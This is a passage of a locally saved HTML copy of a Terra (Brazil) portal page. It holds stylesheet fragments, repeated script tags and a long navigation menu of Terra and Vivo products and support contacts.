			.trr-menu li.menu-item.sports.active li.app-teams__header__item.active>a.app-teams__button.is-disabled {
				background-color: #f1f1f1 !important
			}

			.trr-menu li.menu-item.sports.active li.app-teams__header__item.active>a.app-teams__button {
				background-color: #fff !important;
				border-left: 1px solid #a5a598 !important
			}

			.trr-menu span.trr-section-header {
				padding-left: 5px
			}
		}

		/*# sourceURL=https://s1.trrsf.com/update-1542656194/fe/zaz-app-menu-navbar/_css/theme-default.min.css */
	</style>
	<link rel="preload" href="./index_files/f.txt" as="script">
	<script type="text/javascript" src="./index_files/f.txt"></script>
	<link rel="preload" href="./index_files/f(1).txt" as="script">
	<script type="text/javascript" src="./index_files/f(1).txt"></script>
	<link rel="preload" href="./index_files/f.txt" as="script">
	<script type="text/javascript" src="./index_files/f.txt"></script>
	<link rel="preload" href="./index_files/f(1).txt" as="script">
	<script type="text/javascript" src="./index_files/f(1).txt"></script>
	<link rel="preload" href="./index_files/f.txt" as="script">
	<script type="text/javascript" src="./index_files/f.txt"></script>
	<link rel="preload" href="./index_files/f(1).txt" as="script">
	<script type="text/javascript" src="./index_files/f(1).txt"></script>
	<link rel="preload" href="./index_files/f.txt" as="script">
	<script type="text/javascript" src="./index_files/f.txt"></script>
	<link rel="preload" href="./index_files/f(1).txt" as="script">
	<script type="text/javascript" src="./index_files/f(1).txt"></script>
	<link rel="preload" href="./index_files/f.txt" as="script">
	<script type="text/javascript" src="./index_files/f.txt"></script>
	<link rel="preload" href="./index_files/f(1).txt" as="script">
	<script type="text/javascript" src="./index_files/f(1).txt"></script>
</head>

<body>
	<nav id="zaz--app-navbar-container" class="root-container zaz--standalone nb-container">
		<aside id="zaz-app-nb-plugs-top"></aside>
		<header id="zaz-app-navbar" class="nb-top">
			<section id="zaz-app-nb-plugs-left" class="nb-plugins--left">
				<div class="nb-plugin nb-menuIcon" id="zaz-nb-plugin-menuBtn" data-keep-index="0"><span id="nb-menu"
						class="menu_burger icon icon-24 icon-menu-white" title="Menu"></span><span class="lbl-text"
						id="menu-label" title="MENU">MENU</span></div>
				<div class="nb-plugin nb-pwa-install" id="zaz-nb-plugin-pwaInstall" data-keep-index="2"><span
						class="btn--default btn--small btn--branding btn--pwa-install">Instalar Terra</span></div>
			</section>
			<section id="zaz-app-nb-plugs-right" class="nb-plugins--right">
				<div class="nb-plugin nb-subscribe" id="zaz-nb-plugin-subscribe" data-keep-index="8"><a
						href="https://servicos.terra.com.br/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=terra%20servicos&amp;utm_content=barra%20de%20servicos&amp;utm_term=barra%20de%20servicos&amp;cdConvenio=CVTR00001907"
						class="nb-subscribe__wrap" title="Conheça nossos serviços 0800 777 1234"> <span
							class="nb-subscribe__txt">Conheça nossos serviços <b>0800 777 1234</b></span></a><a
						href="https://central.terra.com.br/login?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=central%20do%20assinante&amp;utm_content=central%20do%20assinante&amp;utm_term=central%20do%20assinante&amp;cdConvenio=CVTR00001907"
						class="nb-subscribe__wrap" title="Atendimento ao cliente 0800 777 9797"> <span
							class="nb-subscribe__phone">Atendimento ao cliente <b>0800 777 9797</b></span></a></div>
			</section><a class="nb__logo" href="http://www.terra.com.br/" title="Ir para a página inicial">Ir para a
				página inicial</a>
			<div id="zaz-app-nb-lock" class="zaz-app-nb-lock"></div>
		</header>
		<aside id="zaz-app-nb-plugs-bottom" class="nb-plugins__bottom">
			<div class="nb-plugin zaz-sva-container" id="zaz-nb-plugin-sva" data-keep-index="0">
				<div class="navbar-sva-desktop">
					<div class="navbar-sva-desktop__pulldown">
						<div class="navbar-sva-desktop__pulldown__title"><a
								class="navbar-sva-desktop__pulldown__title__anchor" href="https://mail.terra.com.br/#"
								data-gtm-event-category="ONL Barra Digital Services - Interno"
								data-gtm-event-action="Clique" data-gtm-event-label="Produtos Terra">Produtos Terra<span
									class="icon icon-12 icon-chevron-down-darkest navbar-sva-desktop__pulldown__title__anchor__icon"></span></a>
						</div>
						<div class="navbar-sva-desktop__pulldown__background">
							<div class="navbar-sva-desktop__pulldown__background__content">
								<div class="navbar-sva-desktop__pulldown__background__content__stripe">
									<p
										class="navbar-sva-desktop__pulldown__background__content__stripe__service navbar-sva-desktop__pulldown__background__content__stripe__service--pf">
										Pra você</p>
									<p
										class="navbar-sva-desktop__pulldown__background__content__stripe__service navbar-sva-desktop__pulldown__background__content__stripe__service--pj">
										Pra sua empresa</p>
									<p
										class="navbar-sva-desktop__pulldown__background__content__stripe__service navbar-sva-desktop__pulldown__background__content__stripe__service--vivo">
										PARCERIA TERRA E VIVO</p>
									<div
										class="navbar-sva-desktop__pulldown__background__content__stripe__service navbar-sva-desktop__pulldown__background__content__stripe__service--close">
										<a class="navbar-sva-desktop__pulldown__background__content__stripe__service__close"
											href="https://mail.terra.com.br/#"><span
												class="icon icon-12 icon-close-dark"></span></a></div>
								</div>
								<div class="navbar-sva-desktop__pulldown__background__content__information">
									<div class="navbar-sva-desktop__pulldown__background__content__information__list"><a
											class="navbar-sva-desktop__pulldown__background__content__information__list__link"
											href="https://servicos.terra.com.br/"><img
												class="navbar-sva-desktop__pulldown__background__content__information__list__logo"
												src="https://drive.google.com/file/d/1j79tIfM_j-y_6FVIUulHz0EO888IYTFS/view?usp=sharing"></a>
										<ul
											class="navbar-sva-desktop__pulldown__background__content__information__list__column">
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Cursos Online"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/cursos-online/promo/super-oferta/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=cursos20online&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos201&amp;cdConvenio=CVTR00001820">Cursos
													Online</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Curso de Inglês"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/curso-de-ingles/promo/super-oferta/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=curso20de20ingles&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos202&amp;cdConvenio=CVTR00001820">Curso
													de Inglês</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item navbar-sva-desktop__pulldown__background__content__information__list__column__item--access">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Mail Gigante"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/mail-gigante/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=mail20gigante&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos203&amp;cdConvenio=CVTR00001820">Mail
													Gigante</a><a
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Acesse seu e-mail" target="_blank"
													href="https://mail.terra.com.br/"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor--access">Acesse
													seu-email</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Antivírus"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/antivirus/promo/super-oferta/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=antivirus&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos201&amp;cdConvenio=CVTR00001820">Antivírus</a>
											</li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Assistência"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/assistencia-tecnica/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=assistencia&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos205&amp;cdConvenio=CVTR00001820">Assistência</a>
											</li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Backup"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/backup/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=backup&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos206&amp;cdConvenio=CVTR00001820">Backup</a>
											</li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Revistas - GoRead"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/revistas-goread/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=revistas20go20read&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos207&amp;cdConvenio=CVTR00001820">Revistas
													Goread</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Música by Napster"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://servicos.terra.com.br/musica-napster/promo/em-casa/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=musica20by20napster&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos208&amp;cdConvenio=CVTR00001820">Música
													by Napster</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Terra Fibra"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terrafibra.com.br/?utm_source=terra&amp;utm_medium=barra20ds&amp;utm_campaign=terra20fibra&amp;utm_content=novopulldown&amp;utm_term=para20voce20pos209&amp;cdConvenio=CVTR00001820">Terra
													Fibra</a></li>
										</ul>
									</div>
									<div class="navbar-sva-desktop__pulldown__background__content__information__list"><a
											class="navbar-sva-desktop__pulldown__background__content__information__list__link"
											href="https://www.terraempresas.com.br/"><img
												class="navbar-sva-desktop__pulldown__background__content__information__list__logo"
												src="https://drive.google.com/file/d/1fjSGWY-YpbSNRgRMJDCuLVjrex0JMsd_/view?usp=sharing"></a>
										<ul
											class="navbar-sva-desktop__pulldown__background__content__information__list__column">
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Construtor de Sites"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/construtor-sites/promo/super-oferta/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=construtor20de20sites&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos201&amp;cdConvenio=CVTR00001820">Construtor
													de Sites</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Site Pronto"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://terraempresas.com.br/construtor-sites/promo/terra-faz-para-voce/?utm_source=&amp;utm_medium=pulldown&amp;utm_campaign=site20pronto&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos202&amp;cdConvenio=CVTR00001820">Site
													Pronto | <span
														class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor__custom">O
														Terra faz pra você</span></a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Loja Virtual"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/loja-virtual/promo/super-oferta/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=loja20virtual&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos203&amp;cdConvenio=CVTR00001820">Loja
													Virtual</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Loja Pronta"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/loja-virtual/promo/terra-faz-para-voce/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=loja20pronta&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos204&amp;cdConvenio=CVTR00001820">Loja
													Pronta | <span
														class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor__custom">O
														Terra faz pra você</span></a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Domínio"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/dominio/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=dominio&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos205&amp;cdConvenio=CVTR00001820">Domínio</a>
											</li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Hospedagem de Sites"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/hospedagem-site/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=hospedagem20de20sites&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos206&amp;cdConvenio=CVTR00001820">Hospedagem
													de Sites</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item navbar-sva-desktop__pulldown__background__content__information__list__column__item--access">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="E-mail Profissional"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/email-profissional/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=e-mail20profissional&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos207&amp;cdConvenio=CVTR00001820">E-mail
													Profissional</a><a
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Acesse seu e-mail profissional"
													target="_blank" href="https://webmail.terraempresas.com.br/"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor--access">Acesse
													seu-email profissional</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Antivírus PJ"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/seguranca-digital/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=antivirus&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos208&amp;cdConvenio=CVTR00001820">Antivírus</a>
											</li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Terra Ads"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.terraempresas.com.br/terra-ads/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=terra20ads&amp;utm_content=novopulldown&amp;utm_term=para20sua20empresa20pos209&amp;cdConvenio=CVTR00001820">Terra
													Ads</a></li>
										</ul>
									</div>
									<div class="navbar-sva-desktop__pulldown__background__content__information__list"><a
											class="navbar-sva-desktop__pulldown__background__content__information__list__link"
											href="https://www.vivo.com.br/"><img
												class="navbar-sva-desktop__pulldown__background__content__information__list__logo"
												src="https://drive.google.com/file/d/1xVxaaWUZI5c7OQ_b2zZeHWTFghr7AcmK/view?usp=sharing"></a>
										<ul
											class="navbar-sva-desktop__pulldown__background__content__information__list__column">
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a target="_blank"
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Conheça os apps da Vivo"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://appstore.vivo.com.br/sc/br/vivostore">Conheça os apps
													da Vivo</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a target="_blank"
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Celulares e acessórios"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.loja.vivo.com.br/">Celulares e acessórios</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a target="_blank"
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label=" Vivo Money"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.vivomoney.com.br/">Vivo Money</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a target="_blank"
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Vivo Gestão de Equipes"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.vivogestaodeequipe.com.br/Site">Vivo Gestão de
													Equipes</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a target="_blank"
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Vivo M2M | IOT"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.vivo.com.br/para-empresas/produtos-e-servicos/digitais/iot">Vivo
													M2M | IOT</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a target="_blank"
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Vivo Cloud"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor"
													href="https://www.vivoplataformadigital.com.br/cms/pt">Vivo
													Cloud</a></li>
										</ul>
									</div>
									<div class="navbar-sva-desktop__pulldown__background__content__information__list"><a
											data-gtm-event-category="ONL Barra Digital Services - Interno"
											data-gtm-event-action="Clique" data-gtm-event-label="Central do Assinante"
											target="_blank"
											href="https://central.terra.com.br/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=central20do20assinante&amp;utm_content=novopulldown&amp;cdConvenio=CVTR00001820"
											class="navbar-sva-desktop__pulldown__background__content__information__list__button navbar-sva-desktop__pulldown__background__content__information__list__button--orange">Central
											do Assinante</a><a
											data-gtm-event-category="ONL Barra Digital Services - Interno"
											data-gtm-event-action="Clique" data-gtm-event-label="2º via do boleto"
											target="_blank" href="https://central.terra.com.br/boleto-simplificado"
											class="navbar-sva-desktop__pulldown__background__content__information__list__button navbar-sva-desktop__pulldown__background__content__information__list__button--white">2º
											via de boleto</a>
										<ul
											class="navbar-sva-desktop__pulldown__background__content__information__list__column">
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique"
													data-gtm-event-label="Perguntas Frequentes" target="_blank"
													href="https://duvidas.terra.com.br/"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor--orange">Perguntas
													Frequentes</a></li>
											<li
												class="navbar-sva-desktop__pulldown__background__content__information__list__column__item">
												<a data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Tutoriais"
													target="_blank" href="https://servicos.terra.com.br/tutoriais"
													class="navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor--orange">Tutoriais</a>
											</li>
										</ul>
										<div
											class="navbar-sva-desktop__pulldown__background__content__information__list__contacts">
											<span class="icon icon-24 icon-phone-orange"></span>
											<div
												class="navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc">
												<p
													class="navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__name">
													Assine já</p>
												<p
													class="navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__number">
													0800 777 1234</p>
											</div>
										</div>
										<div
											class="navbar-sva-desktop__pulldown__background__content__information__list__contacts">
											<span class="icon icon-24 icon-phone-orange"></span>
											<div
												class="navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc">
												<p
													class="navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__name">
													Suporte</p>
												<p
													class="navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__number">
													0800 777 9797</p><a
													data-gtm-event-category="ONL Barra Digital Services - Interno"
													data-gtm-event-action="Clique" data-gtm-event-label="Fale por chat"
													target="_blank" href="https://duvidas.terra.com.br/atendimentoweb"
													class="navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__other">ou
													fale por chat</a>
											</div>
										</div>
										<div
											class="navbar-sva-desktop__pulldown__background__content__information__list__display">
											<a data-gtm-event-category="ONL Barra Digital Services - Interno"
												data-gtm-event-action="Clique"
												data-gtm-event-label="Display - Blog Terra Empresas" target="_blank"
												class="navbar-sva-desktop__pulldown__background__content__information__list__display__anchor"
												href="https://www.terraempresas.com.br/blog/?utm_source=terra&amp;utm_medium=pulldown&amp;utm_campaign=blog20terra20empresas&amp;utm_content=banner_novopulldown&amp;cdConvenio=CVTR00001820"><img
													class="navbar-sva-desktop__pulldown__background__content__information__list__display__anchor__img"
													src="./index_files/banner-ds_v1.png"></a></div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="navbar-sva-desktop__products">
						<ul class="navbar-sva-desktop__products__list">
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Construtor de Sites"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://www.terraempresas.com.br/construtor-sites/promo/super-oferta/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=construtor%20de%20sites&amp;utm_content=construtor%20de%20sites&amp;utm_term=cabeceira%20pos%201&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-builder"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--construtor-de-sites">Construtor
										de Sites</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Mail Gigante"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://servicos.terra.com.br/mail-gigante/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=mail%20gigante&amp;utm_content=mail%20gigante&amp;utm_term=cabeceira%20pos%202&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-mail"></span>
									<span class="navbar-sva-desktop__products__list__item__anchor--mail-gigante">Mail
										Gigante</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Loja Virtual"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://www.terraempresas.com.br/loja-virtual/promo/super-oferta/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=loja%20virtual&amp;utm_content=loja%20virtual&amp;utm_term=cabeceira%20pos%203&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-store"></span>
									<span class="navbar-sva-desktop__products__list__item__anchor--loja-virtual">Loja
										Virtual</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Cursos Online"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://servicos.terra.com.br/cursos-online/promo/super-oferta/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=cursos%20online&amp;utm_content=cursos%20online&amp;utm_term=cabeceira%20pos%204&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-cursos-online"></span>
									<span class="navbar-sva-desktop__products__list__item__anchor--cursos-online">Cursos
										Online</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Antivírus"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://servicos.terra.com.br/antivirus/promo/super-oferta/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=antivirus&amp;utm_content=antivirus&amp;utm_term=cabeceira%20pos%205&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-antivirus"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--antivirus">Antivírus</span></a>
							</li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Curso de Inglês"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://servicos.terra.com.br/curso-de-ingles/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=curso%20de%20ingles&amp;utm_content=curso%20de%20ingles&amp;utm_term=cabeceira%20pos%206&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-english-course"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--curso-de-ingles">Curso
										de Inglês</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Hospedagem de Sites"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://www.terraempresas.com.br/hospedagem-site/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=hospedagem%20de%20sites&amp;utm_content=hospedagem%20de%20sites&amp;utm_term=cabeceira%20pos%207&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-host"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--hospedagem">Hospedagem
										de Sites</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="E-mail Profissional"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://www.terraempresas.com.br/email-profissional/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=e-mail%20profissional&amp;utm_content=e-mail%20profissional&amp;utm_term=cabeceira%20pos%207&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-mail-pro"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--email-profissional">E-mail
										Profissional</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Assistência"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://servicos.terra.com.br/assistencia-tecnica/promo/dia-a-dia/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=assistencia&amp;utm_content=assistencia&amp;utm_term=cabeceira%20pos%209&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-assistencia"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--assistencia">Assistência</span></a>
							</li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Terra Ads"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://www.terraempresas.com.br/terra-ads/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=terra%20ads&amp;utm_content=terra%20ads&amp;utm_term=cabeceira%20pos%208&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-ads"></span>
									<span class="navbar-sva-desktop__products__list__item__anchor--terra-ads">Terra
										Ads</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Música"
									class="navbar-sva-desktop__products__list__item__anchor"
